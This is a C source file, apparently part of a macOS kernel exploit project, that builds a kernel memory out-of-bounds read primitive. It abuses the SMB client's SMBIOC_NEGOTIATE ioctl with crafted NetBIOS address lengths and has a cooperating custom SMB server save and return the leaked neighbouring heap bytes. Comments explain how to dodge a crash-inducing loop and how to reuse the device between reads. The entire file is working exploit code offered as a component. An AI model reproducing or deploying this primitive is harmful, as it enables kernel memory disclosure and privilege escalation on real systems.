//
//  zkext_neighbor_reader_xs.c
//  kmem_xepg
//
//  Created by admin on 1/3/22.
//

#include <assert.h>
#include <stdlib.h>
#include <stdatomic.h>

#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xe/util/assert.h>

#include "../smb/client.h"
#include "../public/xe_kmem/smbx_conf.h"

#include "kmem_neighbor_reader.h"


struct kmem_neighbor_reader {
    int fd_snb_name_client;
    int fd_kmem_reader;
    _Atomic uint32_t keygen;
};

static dispatch_once_t g_kmem_neighbor_reader_token;
static struct kmem_neighbor_reader* g_kmem_neighbor_reader;


struct kmem_neighbor_reader* kmem_neighbor_reader_create(const struct sockaddr_in* smb_addr) {
    struct kmem_neighbor_reader* reader = malloc(sizeof(struct kmem_neighbor_reader));
    
    /// SMB device used to execute `SMBIOC_NEGOTIATE` ioctl request for OOB read
    reader->fd_kmem_reader = smb_client_open_dev();
    xe_assert_cond(reader->fd_kmem_reader, >=, 0);
    
    /// SMB device for reading saved server and local netbios name from server
    /// This device should be connected to a SMB share for executing custom SMB
    /// commands using `SMBIOC_REQUEST` ioctl
    reader->fd_snb_name_client = smb_client_open_dev();
    xe_assert_cond(reader->fd_snb_name_client, >=, 0);
    int error = smb_client_ioc_negotiate(reader->fd_snb_name_client, smb_addr, sizeof(*smb_addr), FALSE);
    xe_assert_err(error);
    error = smb_client_ioc_tcon(reader->fd_snb_name_client, "default");
    xe_assert_err(error);
    
    return reader;
}

void kmem_neighbor_reader_read(const struct kmem_neighbor_reader_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size) {
    
    dispatch_once(&g_kmem_neighbor_reader_token, ^{
        g_kmem_neighbor_reader = kmem_neighbor_reader_create(&args->smb_addr);
    });
    
    /// If the segment length is 255, an infinite for loop will be created in `nb_put_name`
    /// due to integer overflow (Line: `seglen = (*cp) + 1`)
    xe_assert(args->saddr_snb_name_seglen != 0xff);
    xe_assert(args->laddr_snb_name_seglen != 0xff);
    xe_assert_cond(args->laddr_ioc_len, >=, offsetof(struct sockaddr_nb, snb_name) + sizeof(struct xe_kmem_nb_laddr_cmd) + 1);
    
    struct sockaddr_nb saddr;
    struct sockaddr_nb laddr;
    
    bzero(&saddr, sizeof(saddr));
    bzero(&laddr, sizeof(laddr));
    
    saddr.snb_family = AF_NETBIOS;
    saddr.snb_addrin = args->smb_addr;
    saddr.snb_len = args->saddr_snb_len;
    saddr.snb_name[0] = args->saddr_snb_name_seglen;
    
    laddr.snb_family = AF_NETBIOS;
    laddr.snb_len = args->laddr_snb_len;
    laddr.snb_name[0] = args->laddr_snb_name_seglen;
    
    static_assert(sizeof(laddr.snb_name) >= sizeof(struct xe_kmem_nb_laddr_cmd) + 1, "");
    
    /// Embed custom instructions for xe_smbx server. See `RequestHandler::handleNetbiosSsnRequest`
    /// method in xe_smbx/main.swift
    struct xe_kmem_nb_laddr_cmd* cmd_paddr = (struct xe_kmem_nb_laddr_cmd*)&laddr.snb_name[1];
    cmd_paddr->key = atomic_fetch_add(&g_kmem_neighbor_reader->keygen, 1);
    cmd_paddr->magic = XE_KMEM_NB_LADDR_CMD_MAGIC;
    
    /// Tell xe_smbx server to save the received server and local netbios name
    cmd_paddr->flags = XE_KMEM_NB_LADDR_CMD_FLAG_SAVE;
    
    /// Tell xe_smbx server to respond with `NB_SSN_NEGRESP` response code whiich will lead to
    /// failure of `SMBIOC_NEGOTIATE` ioctl syscall. This will allow us to reuse the
    /// `g_kmem_neighbor_reader->fd_kmem_reader` without having to close and open an new
    /// SMB device
    cmd_paddr->flags |= XE_KMEM_NB_LADDR_CMD_FLAG_FAIL;
    
    int error = smb_client_ioc_negotiate_nb(g_kmem_neighbor_reader->fd_kmem_reader, &saddr, args->saddr_ioc_len, &laddr, args->laddr_ioc_len);
    xe_assert_cond(error, ==, ECONNABORTED);
    
    error = smb_client_ioc_read_saved_nb_ssn_request(g_kmem_neighbor_reader->fd_snb_name_client, cmd_paddr->key, server_nb_name, server_nb_name_size, local_nb_name, local_nb_name_size);
    xe_assert_err(error);
}

